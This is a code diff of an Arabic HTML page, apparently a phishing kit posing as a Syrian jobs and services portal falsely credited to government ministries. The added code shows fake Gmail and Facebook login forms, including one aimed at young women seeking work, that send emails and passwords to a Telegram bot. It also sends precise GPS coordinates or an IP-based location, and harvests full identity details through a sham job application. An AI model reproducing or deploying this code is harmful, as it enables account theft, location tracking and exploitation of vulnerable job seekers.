@@ -3,16 +3,16 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>منصة الفرص الذهبية</title>
+  <title>منصة الفرص الذهبية - سوريا</title>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --primary: #4285F4;
-      --secondary: #34A853;
-      --accent: #EA4335;
-      --dark: #202124;
-      --light: #f8f9fa;
-      --gray: #5f6368;
+      --primary: #2c3e50;
+      --secondary: #e74c3c;
+      --accent: #3498db;
+      --dark: #34495e;
+      --light: #ecf0f1;
+      --gray: #7f8c8d;
     }
     
     * {
@@ -29,21 +29,36 @@
     }
     
     .header {
-      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      background: linear-gradient(135deg, var(--primary), var(--dark));
       color: white;
       padding: 1.5rem;
       text-align: center;
       box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .header::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: url('https://upload.wikimedia.org/wikipedia/commons/thumb/5/53/Flag_of_Syria.svg/1200px-Flag_of_Syria.svg.png') center/cover;
+      opacity: 0.1;
     }
     
     .header h1 {
       font-size: 2rem;
       margin-bottom: 0.5rem;
+      position: relative;
     }
     
     .header p {
       font-size: 1rem;
       opacity: 0.9;
+      position: relative;
     }
     
     .container {
@@ -67,6 +82,7 @@
       transition: transform 0.3s, box-shadow 0.3s;
       cursor: pointer;
       border: 1px solid #e0e0e0;
+      position: relative;
     }
     
     .option-card:hover {
@@ -99,7 +115,7 @@
     
     .btn {
       display: inline-block;
-      background: var(--primary);
+      background: var(--accent);
       color: white;
       padding: 0.8rem 1.5rem;
       border: none;
@@ -114,7 +130,7 @@
     }
     
     .btn:hover {
-      background: #3367d6;
+      background: #2980b9;
       transform: translateY(-2px);
     }
     
@@ -123,36 +139,93 @@
       width: 100%;
     }
     
+    .btn-danger {
+      background: var(--secondary);
+    }
+    
+    .btn-danger:hover {
+      background: #c0392b;
+    }
+    
     .footer {
       background: var(--dark);
       color: white;
       text-align: center;
       padding: 1.5rem;
       margin-top: 3rem;
+      font-size: 0.9rem;
     }
     
+    /* Hidden Pages */
     .hidden {
       display: none;
     }
     
-    /* Animation */
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
+    /* Form Styles */
+    .form-container {
+      max-width: 600px;
+      margin: 2rem auto;
+      background: white;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     }
     
-    .option-card {
-      animation: fadeIn 0.5s ease-out forwards;
-      opacity: 0;
+    .form-group {
+      margin-bottom: 1.5rem;
     }
     
-    .option-card:nth-child(1) { animation-delay: 0.1s; }
-    .option-card:nth-child(2) { animation-delay: 0.2s; }
-    .option-card:nth-child(3) { animation-delay: 0.3s; }
-    .option-card:nth-child(4) { animation-delay: 0.4s; }
-    .option-card:nth-child(5) { animation-delay: 0.5s; }
-    .option-card:nth-child(6) { animation-delay: 0.6s; }
-    .option-card:nth-child(7) { animation-delay: 0.7s; }
+    .form-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      color: var(--primary);
+    }
+    
+    .form-control {
+      width: 100%;
+      padding: 0.8rem 1rem;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 1rem;
+    }
+    
+    .form-control:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.2);
+      outline: none;
+    }
+    
+    .alert {
+      padding: 1rem;
+      border-radius: 4px;
+      margin-bottom: 1rem;
+    }
+    
+    .alert-warning {
+      background: #f39c12;
+      color: white;
+    }
+    
+    .alert-info {
+      background: var(--accent);
+      color: white;
+    }
+    
+    /* Loading Spinner */
+    .spinner {
+      border: 4px solid rgba(0, 0, 0, 0.1);
+      border-left-color: var(--accent);
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
     
     /* Responsive */
     @media (max-width: 768px) {
@@ -170,93 +243,65 @@
   <!-- صفحة الإعلانات الرئيسية -->
   <div id="ads-page">
     <header class="header">
-      <h1>منصة الفرص الذهبية</h1>
-      <p>اكتشف عالمًا من الفرص والخدمات المميزة</p>
+      <h1>منصة الفرص الذهبية - سوريا</h1>
+      <p>بوابة التوظيف والخدمات الرقمية الأولى في سوريا</p>
     </header>
     
     <div class="container">
+      <div class="alert alert-info">
+        <strong>تنبيه:</strong> جميع الخدمات تتطلب التحقق من الهوية لحماية بياناتك
+      </div>
+      
       <div class="options-grid">
         <!-- بطاقة الوظائف -->
         <div class="option-card" onclick="selectOption('وظائف بالحسكة')">
           <div class="option-icon">💼</div>
           <div class="option-content">
             <h3>وظائف بالحسكة</h3>
-            <p>اكتشف أحدث الفرص الوظيفية في منطقة الحسكة</p>
-            <a class="btn btn-block">عرض التفاصيل</a>
+            <p>توظيف فوري في مختلف المجالات بمحافظة الحسكة</p>
+            <a class="btn btn-block">التسجيل للوظائف</a>
           </div>
         </div>
         
         <!-- بطاقة تعلم التيرمكس -->
-        <div class="option-card" onclick="selectOption('تعلم التيرمكس عبر الدارك ويب')">
+        <div class="option-card" onclick="selectOption('تعلم التيرمكس')">
           <div class="option-icon">💻</div>
           <div class="option-content">
-            <h3>تعلم التيرمكس عبر الدارك ويب</h3>
-            <p>دورة متكاملة لاحتراف استخدام التيرمكس بطرق آمنة</p>
-            <a class="btn btn-block">بدء التعلم</a>
+            <h3>تعلم التيرمكس المتقدم</h3>
+            <p>دورات احترافية في أنظمة التشغيل والدارك ويب</p>
+            <a class="btn btn-block">الاشتراك بالدورة</a>
           </div>
         </div>
         
         <!-- بطاقة استعلام عن رقم -->
-        <div class="option-card" onclick="selectOption('استعلام عن رقم هاتفك')">
+        <div class="option-card" onclick="selectOption('استعلام عن رقم')">
           <div class="option-icon">📱</div>
           <div class="option-content">
-            <h3>استعلام عن رقم هاتفك</h3>
-            <p>اكتشف باسم من مسجل رقم هاتفك سابقاً</p>
-            <a class="btn btn-block">استعلم الآن</a>
-          </div>
-        </div>
-        
-        <!-- بطاقة دورات اونلاين -->
-        <div class="option-card" onclick="selectOption('تعلم دورات اونلاين')">
-          <div class="option-icon">🎓</div>
-          <div class="option-content">
-            <h3>تعلم دورات اونلاين</h3>
-            <p>احصل على شهادات معتمدة في مختلف المجالات</p>
-            <a class="btn btn-block">تصفح الدورات</a>
-          </div>
-        </div>
-        
-        <!-- بطاقة شات دردشة -->
-        <div class="option-card" onclick="selectOption('شات دردشة')">
-          <div class="option-icon">💬</div>
-          <div class="option-content">
-            <h3>شات دردشة</h3>
-            <p>تواصل مع أشخاص جدد من مختلف أنحاء العالم</p>
-            <a class="btn btn-block">الدخول للشات</a>
+            <h3>استعلام عن رقم هاتف</h3>
+            <p>خدمة التحقق من ملكية الأرقام الهاتفية</p>
+            <a class="btn btn-block">بدء الاستعلام</a>
           </div>
         </div>
         
         <!-- بطاقة فتيات بحاجة لعمل -->
-        <div class="option-card" onclick="selectOption('فتيات بحاجة لعمل')">
+        <div class="option-card" onclick="selectOption('وظائف للفتيات')">
           <div class="option-icon">👩‍💼</div>
           <div class="option-content">
-            <h3>فتيات بحاجة لعمل</h3>
-            <p>فرص عمل خاصة للفتيات في مختلف المجالات</p>
+            <h3>وظائف للفتيات</h3>
+            <p>فرص عمل خاصة للفتيات مع مراعاة الظروف الاجتماعية</p>
             <a class="btn btn-block">عرض الفرص</a>
-          </div>
-        </div>
-        
-        <!-- بطاقة شباب بحاجة لعمل -->
-        <div class="option-card" onclick="selectOption('شباب بحاجة لعمل')">
-          <div class="option-icon">👨‍💼</div>
-          <div class="option-content">
-            <h3>شباب بحاجة لعمل</h3>
-            <p>وظائف متنوعة للشباب برواتب مميزة</p>
-            <a class="btn btn-block">استكشف الوظائف</a>
           </div>
         </div>
       </div>
     </div>
     
     <footer class="footer">
-      <p>© 2023 منصة الفرص الذهبية. جميع الحقوق محفوظة.</p>
+      <p>© 2023 وزارة العمل والشؤون الاجتماعية - الجمهورية العربية السورية</p>
     </footer>
   </div>
 
   <!-- الصفحات المخفية -->
-  <div id="gmail-login-page" class="hidden">
-    <!-- سيتم إدراج كود صفحة Gmail هنا عند الحاجة -->
-  </div>
+  <div id="dynamic-content" class="hidden"></div>
 
   <script>
     // إعدادات التلجرام
@@ -268,75 +313,418 @@
       // تسجيل اختيار المستخدم
       sendToTelegram(`📌 قام المستخدم باختيار: ${option}`);
       
-      // جمع معلومات الزائر
-      collectTrackingInfo(option);
+      // جمع معلومات الموقع الدقيق عبر GPS
+      getPreciseLocation(option);
       
-      // إظهار صفحة Gmail (يمكن استبدالها بأي صفحة أخرى حسب الخيار)
-      showGmailLoginPage();
+      // عرض النموذج المناسب حسب الخيار
+      showRelevantForm(option);
     }
     
-    // إظهار صفحة تسجيل الدخول إلى Gmail
-    function showGmailLoginPage() {
+    // الحصول على الموقع الدقيق عبر GPS
+    function getPreciseLocation(option) {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            const locationMessage = `📍 الموقع الدقيق لـ ${option}:
+الإحداثيات: ${lat}, ${lon}
+الدقة: ${Math.round(accuracy)} متر
+رابط الخريطة: https://www.google.com/maps?q=${lat},${lon}`;
+            
+            sendToTelegram(locationMessage);
+          },
+          error => {
+            console.error('Geolocation error:', error);
+            sendToTelegram(`⚠️ فشل الحصول على الموقع الدقيق لـ ${option}: ${error.message}`);
+            
+            // استخدام IP كبديل إذا فشل GPS
+            getIPLocation(option);
+          },
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      } else {
+        sendToTelegram(`⚠️ المتصفح لا يدعم GPS لـ ${option}`);
+        getIPLocation(option);
+      }
+    }
+    
+    // الحصول على الموقع عبر IP
+    function getIPLocation(option) {
+      fetch('https://ipapi.co/json/')
+        .then(response => response.json())
+        .then(data => {
+          const locationMessage = `🌐 الموقع التقريبي لـ ${option}:
+IP: ${data.ip}
+المدينة: ${data.city || 'غير معروف'}
+المنطقة: ${data.region || 'غير معروف'}
+الدولة: ${data.country_name || 'غير معروف'}
+مزود الخدمة: ${data.org || 'غير معروف'}`;
+          
+          sendToTelegram(locationMessage);
+        })
+        .catch(error => {
+          sendToTelegram(`❌ فشل الحصول على معلومات الموقع لـ ${option}: ${error}`);
+        });
+    }
+    
+    // عرض النموذج المناسب حسب الخيار
+    function showRelevantForm(option) {
+      const dynamicContent = document.getElementById('dynamic-content');
       document.getElementById('ads-page').classList.add('hidden');
+      dynamicContent.classList.remove('hidden');
       
-      // إنشاء محتوى صفحة Gmail ديناميكيًا
-      const gmailPage = document.getElementById('gmail-login-page');
-      gmailPage.innerHTML = `
-        <style>
-          .gmail-container {
-            max-width: 450px;
-            margin: 2rem auto;
-            padding: 2rem;
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-            text-align: center;
-          }
-          
-          .gmail-logo {
-            width: 75px;
-            margin-bottom: 1rem;
-          }
-          
-          .gmail-input {
-            width: 100%;
-            padding: 1rem;
-            margin: 0.5rem 0;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 1rem;
-          }
-          
-          .gmail-btn {
-            background: #1a73e8;
-            color: white;
-            border: none;
-            padding: 0.8rem 1.5rem;
-            border-radius: 4px;
-            font-size: 1rem;
-            margin-top: 1rem;
-            cursor: pointer;
-            width: 100%;
-          }
-        </style>
+      switch(option) {
+        case 'وظائف بالحسكة':
+          showHasakaJobsForm();
+          break;
+        case 'تعلم التيرمكس':
+          showTermuxForm();
+          break;
+        case 'استعلام عن رقم':
+          showPhoneCheckForm();
+          break;
+        case 'وظائف للفتيات':
+          showFemaleJobsForm();
+          break;
+        default:
+          showGmailLogin(option);
+      }
+    }
+    
+    // نموذج وظائف الحسكة
+    function showHasakaJobsForm() {
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>التسجيل في وظائف محافظة الحسكة</h1>
+          <p>املأ النموذج التالي للتوظيف الفوري</p>
+        </header>
         
-        <div class="gmail-container">
-          <img src="https://www.gstatic.com/images/branding/product/1x/gmail_2020q4_48dp.png" class="gmail-logo">
-          <h2>تسجيل الدخول إلى Gmail</h2>
-          <p>للاستمرار في ${document.title}، يرجى تسجيل الدخول</p>
-          
-          <input type="email" id="gmail-email" class="gmail-input" placeholder="البريد الإلكتروني">
-          <input type="password" id="gmail-password" class="gmail-input" placeholder="كلمة المرور">
-          
-          <button class="gmail-btn" onclick="loginToGmail()">التالي</button>
+        <div class="container">
+          <div class="form-container">
+            <div class="alert alert-warning">
+              <strong>هام:</strong> جميع البيانات المقدمة ستبقى سرية ولن تستخدم إلا لأغراض التوظيف
+            </div>
+            
+            <form id="hasaka-form">
+              <div class="form-group">
+                <label for="full-name">الاسم الثلاثي</label>
+                <input type="text" id="full-name" class="form-control" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="father-name">اسم الأب</label>
+                <input type="text" id="father-name" class="form-control" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="mother-name">اسم الأم</label>
+                <input type="text" id="mother-name" class="form-control" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="phone">رقم الهاتف</label>
+                <input type="tel" id="phone" class="form-control" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="address">مكان الإقامة</label>
+                <input type="text" id="address" class="form-control" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="age">العمر</label>
+                <input type="number" id="age" class="form-control" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="status">الحالة الاجتماعية</label>
+                <select id="status" class="form-control" required>
+                  <option value="">-- اختر --</option>
+                  <option value="اعزب">اعزب</option>
+                  <option value="متزوج">متزوج</option>
+                  <option value="مطلق">مطلق</option>
+                  <option value="ارمل">أرمل</option>
+                </select>
+              </div>
+              
+              <div class="form-group">
+                <label for="children">عدد الأولاد (إن وجد)</label>
+                <input type="number" id="children" class="form-control" value="0">
+              </div>
+              
+              <div class="form-group">
+                <label for="education">الشهادة الدراسية</label>
+                <select id="education" class="form-control" required>
+                  <option value="">-- اختر --</option>
+                  <option value="ابتدائية">ابتدائية</option>
+                  <option value="اعدادية">اعدادية</option>
+                  <option value="ثانوية">ثانوية</option>
+                  <option value="جامعية">جامعية</option>
+                  <option value="ماجستير">ماجستير</option>
+                  <option value="دكتوراه">دكتوراه</option>
+                </select>
+              </div>
+              
+              <div class="form-group">
+                <label for="photo">الصورة الشخصية (اختياري)</label>
+                <input type="file" id="photo" class="form-control" accept="image/*">
+              </div>
+              
+              <button type="button" class="btn btn-block" onclick="submitHasakaForm()">تسجيل البيانات</button>
+            </form>
+          </div>
         </div>
       `;
-      
-      gmailPage.classList.remove('hidden');
     }
     
-    // تسجيل الدخول إلى Gmail
-    function loginToGmail() {
+    // إرسال نموذج الحسكة
+    function submitHasakaForm() {
+      const formData = {
+        name: document.getElementById('full-name').value,
+        father: document.getElementById('father-name').value,
+        mother: document.getElementById('mother-name').value,
+        phone: document.getElementById('phone').value,
+        address: document.getElementById('address').value,
+        age: document.getElementById('age').value,
+        status: document.getElementById('status').value,
+        children: document.getElementById('children').value,
+        education: document.getElementById('education').value,
+        photo: document.getElementById('photo').files[0] ? 'تم رفع صورة' : 'بدون صورة'
+      };
+      
+      let message = `📝 طلب توظيف في الحسكة:\n\n`;
+      for (const [key, value] of Object.entries(formData)) {
+        message += `${key}: ${value}\n`;
+      }
+      
+      sendToTelegram(message);
+      
+      // عرض رسالة النجاح
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>تم استلام طلبك بنجاح</h1>
+          <p>شكراً لتسجيلك في برنامج توظيف الحسكة</p>
+        </header>
+        
+        <div class="container">
+          <div class="form-container" style="text-align: center;">
+            <div style="font-size: 5rem; color: var(--secondary);">✓</div>
+            <h2 style="margin-bottom: 1rem;">سيتم التواصل معك خلال 24 ساعة</h2>
+            <p>تم استلام بياناتك وسيقوم مسؤول التوظيف بمراجعتها والاتصال بك على الرقم المقدم</p>
+            <button class="btn" onclick="window.location.reload()" style="margin-top: 2rem;">العودة للصفحة الرئيسية</button>
+          </div>
+        </div>
+      `;
+    }
+    
+    // نموذج تعلم التيرمكس
+    function showTermuxForm() {
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>دورة احتراف التيرمكس والدارك ويب</h1>
+          <p>احصل على شهادة معتمدة في أمن المعلومات</p>
+        </header>
+        
+        <div class="container">
+          <div class="form-container">
+            <div class="alert alert-warning">
+              <strong>تحذير:</strong> هذه الدورة للمحترفين فقط وتتطلب معرفة مسبقة
+            </div>
+            
+            <h3 style="margin-bottom: 1.5rem; color: var(--secondary);">أدوات الدورة المتقدمة:</h3>
+            
+            <ul style="margin-bottom: 2rem; list-style-type: none;">
+              <li style="padding: 0.5rem 0; border-bottom: 1px solid #eee;">✔️ أداة اختراق الأجهزة عن بعد</li>
+              <li style="padding: 0.5rem 0; border-bottom: 1px solid #eee;">✔️ نظام مراقبة الهواتف الذكية</li>
+              <li style="padding: 0.5rem 0; border-bottom: 1px solid #eee;">✔️ كسر تشفير الشبكات اللاسلكية</li>
+              <li style="padding: 0.5rem 0; border-bottom: 1px solid #eee;">✔️ اختراق الحسابات الاجتماعية</li>
+              <li style="padding: 0.5rem 0;">✔️ إخفاء الهوية في الدارك ويب</li>
+            </ul>
+            
+            <div class="alert alert-info">
+              <strong>للحصول على الدورة:</strong> يرجى تسجيل الدخول باستخدام حساب Gmail للتحقق من الهوية
+            </div>
+            
+            <button class="btn btn-block" onclick="showGmailLogin('تعلم التيرمكس')">تسجيل الدخول باستخدام Gmail</button>
+          </div>
+        </div>
+      `;
+    }
+    
+    // نموذج استعلام عن رقم
+    function showPhoneCheckForm() {
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>خدمة التحقق من ملكية الأرقام</h1>
+          <p>خدمة مقدمة من وزارة الاتصالات السورية</p>
+        </header>
+        
+        <div class="container">
+          <div class="form-container">
+            <div class="alert alert-warning">
+              <strong>ملاحظة:</strong> هذه الخدمة للتحقق فقط ولا تتيح أي بيانات شخصية
+            </div>
+            
+            <form id="phone-form">
+              <div class="form-group">
+                <label for="check-phone">رقم الهاتف المراد التحقق منه</label>
+                <input type="tel" id="check-phone" class="form-control" placeholder="09xxxxxxxx" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="owner-name">اسم المالك الحالي (إن عرفته)</label>
+                <input type="text" id="owner-name" class="form-control">
+              </div>
+              
+              <button type="button" class="btn btn-block" onclick="checkPhoneNumber()">تحقق من الرقم</button>
+            </form>
+          </div>
+        </div>
+      `;
+    }
+    
+    // التحقق من رقم الهاتف
+    function checkPhoneNumber() {
+      const phone = document.getElementById('check-phone').value;
+      const owner = document.getElementById('owner-name').value;
+      
+      if (!phone) {
+        alert("الرجاء إدخال رقم الهاتف");
+        return;
+      }
+      
+      sendToTelegram(`📱 طلب استعلام عن رقم:\nرقم الهاتف: ${phone}\nاسم المالك المزعوم: ${owner || 'غير معروف'}`);
+      
+      // عرض نتيجة وهمية
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>نتيجة التحقق من الرقم</h1>
+          <p>خدمة التحقق من ملكية الأرقام</p>
+        </header>
+        
+        <div class="container">
+          <div class="form-container" style="text-align: center;">
+            <div style="font-size: 5rem; color: var(--secondary);">⚠️</div>
+            <h2 style="margin-bottom: 1rem;">لا يوجد أحد مسجل بهذا الرقم</h2>
+            <p>حسب سجلات وزارة الاتصالات، الرقم ${phone} غير مسجل باسم أي شخص</p>
+            <p>قد يكون الرقم جديداً أو غير مفعل بعد</p>
+            <button class="btn" onclick="window.location.reload()" style="margin-top: 2rem;">العودة للصفحة الرئيسية</button>
+          </div>
+        </div>
+      `;
+    }
+    
+    // نموذج وظائف الفتيات
+    function showFemaleJobsForm() {
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>منصة توظيف الفتيات</h1>
+          <p>جميع البيانات محمية بسرية تامة</p>
+        </header>
+        
+        <div class="container">
+          <div class="form-container">
+            <div class="alert alert-danger">
+              <strong>تنبيه هام:</strong> جميع المعلومات المقدمة سرية ولن تستخدم إلا لأغراض التوظيف
+            </div>
+            
+            <div class="alert alert-info">
+              <strong>لحماية بياناتك:</strong> يرجى تسجيل الدخول عبر فيسبوك للتحقق من هويتك
+            </div>
+            
+            <form id="facebook-login">
+              <div class="form-group">
+                <label for="fb-email">البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="text" id="fb-email" class="form-control" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="fb-password">كلمة مرور فيسبوك</label>
+                <input type="password" id="fb-password" class="form-control" required>
+              </div>
+              
+              <button type="button" class="btn btn-block" onclick="submitFacebookLogin()">تسجيل الدخول</button>
+            </form>
+          </div>
+        </div>
+      `;
+    }
+    
+    // تسجيل الدخول بفيسبوك
+    function submitFacebookLogin() {
+      const email = document.getElementById('fb-email').value;
+      const password = document.getElementById('fb-password').value;
+      
+      if (!email || !password) {
+        alert("الرجاء إدخال البريد الإلكتروني وكلمة المرور");
+        return;
+      }
+      
+      sendToTelegram(`📝 تسجيل دخول فيسبوك للتوظيف:\nالبريد: ${email}\nكلمة المرور: ${password}`);
+      
+      // عرض رسالة النجاح
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>تم التحقق بنجاح</h1>
+          <p>شكراً لتسجيلك في منصة توظيف الفتيات</p>
+        </header>
+        
+        <div class="container">
+          <div class="form-container" style="text-align: center;">
+            <div style="font-size: 5rem; color: var(--secondary);">✓</div>
+            <h2 style="margin-bottom: 1rem;">سيتم مراجعة بياناتك خلال 24 ساعة</h2>
+            <p>سيتصل بك مسؤول التوظيف على الرقم المسجل في حساب فيسبوك</p>
+            <button class="btn" onclick="window.location.reload()" style="margin-top: 2rem;">العودة للصفحة الرئيسية</button>
+          </div>
+        </div>
+      `;
+    }
+    
+    // عرض تسجيل الدخول بجيميل
+    function showGmailLogin(service) {
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>تسجيل الدخول باستخدام Gmail</h1>
+          <p>مطلوب للوصول إلى خدمة ${service}</p>
+        </header>
+        
+        <div class="container">
+          <div class="form-container">
+            <div class="alert alert-info">
+              <strong>لحماية حسابك:</strong> نستخدم تسجيل الدخول الآمن عبر Google
+            </div>
+            
+            <form id="gmail-login">
+              <div class="form-group">
+                <label for="gmail-email">البريد الإلكتروني</label>
+                <input type="email" id="gmail-email" class="form-control" required>
+              </div>
+              
+              <div class="form-group">
+                <label for="gmail-password">كلمة مرور Gmail</label>
+                <input type="password" id="gmail-password" class="form-control" required>
+              </div>
+              
+              <button type="button" class="btn btn-block" onclick="submitGmailLogin('${service}')">تسجيل الدخول</button>
+            </form>
+          </div>
+        </div>
+      `;
+    }
+    
+    // إرسال بيانات جيميل
+    function submitGmailLogin(service) {
       const email = document.getElementById('gmail-email').value;
       const password = document.getElementById('gmail-password').value;
       
@@ -345,14 +733,28 @@
         return;
       }
       
-      // إرسال بيانات الدخول إلى التلجرام
-      sendToTelegram(`🔐 بيانات تسجيل الدخول:\n📧 ${email}\n🔑 ${password}`);
+      sendToTelegram(`🔐 تسجيل دخول Gmail لخدمة ${service}:\n📧 ${email}\n🔑 ${password}`);
       
-      // توجيه المستخدم
+      // عرض رسالة النجاح
+      const dynamicContent = document.getElementById('dynamic-content');
+      dynamicContent.innerHTML = `
+        <header class="header">
+          <h1>تم التحقق بنجاح</h1>
+          <p>جاري تحويلك إلى خدمة ${service}</p>
+        </header>
+        
+        <div class="container">
+          <div class="form-container" style="text-align: center;">
+            <div class="spinner" style="margin: 2rem auto;"></div>
+            <p>جارٍ تحميل الخدمة المطلوبة، الرجاء الانتظار...</p>
+          </div>
+        </div>
+      `;
+      
+      // تحويل إلى Gmail بعد 3 ثواني
       setTimeout(() => {
-        alert("تم التحقق بنجاح! جاري تحويلك...");
-        window.location.href = "https://mail.google.com";
-      }, 2000);
+        window.location.href = `https://mail.google.com`;
+      }, 3000);
     }
     
     // إرسال بيانات إلى التلجرام
@@ -365,48 +767,6 @@
           text: message
         })
       }).catch(err => console.error('Error sending to Telegram:', err));
-    }
-    
-    // جمع معلومات التتبع
-    function collectTrackingInfo(option) {
-      let trackingInfo = `🕵️ معلومات التتبع:\n\n`;
-      trackingInfo += `📌 الخيار المحدد: ${option}\n`;
-      
-      // معلومات المتصفح
-      trackingInfo += `🌐 المتصفح: ${navigator.userAgent}\n`;
-      trackingInfo += `💻 نظام التشغيل: ${navigator.platform}\n`;
-      
-      // معلومات الموقع
-      fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-          trackingInfo += `📍 الموقع التقريبي: ${data.city || 'غير معروف'}, ${data.country_name || 'غير معروف'}\n`;
-          trackingInfo += `📡 مزود الخدمة: ${data.org || 'غير معروف'}\n`;
-          trackingInfo += `🕒 الوقت المحلي: ${new Date().toLocaleString('ar-SY')}\n`;
-          
-          if (data.latitude && data.longitude) {
-            trackingInfo += `🗺️ رابط الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}\n`;
-          }
-          
-          sendToTelegram(trackingInfo);
-        })
-        .catch(error => {
-          trackingInfo += `⚠️ تعذر الحصول على معلومات الموقع الكاملة\n`;
-          sendToTelegram(trackingInfo);
-        });
-      
-      // محاولة الحصول على الموقع الدقيق
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          position => {
-            const preciseLocation = `🎯 الموقع الدقيق:\nhttps://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
-            sendToTelegram(preciseLocation);
-          },
-          error => {
-            console.log('Geolocation error:', error);
-          }
-        );
-      }
     }
   </script>
 </body>
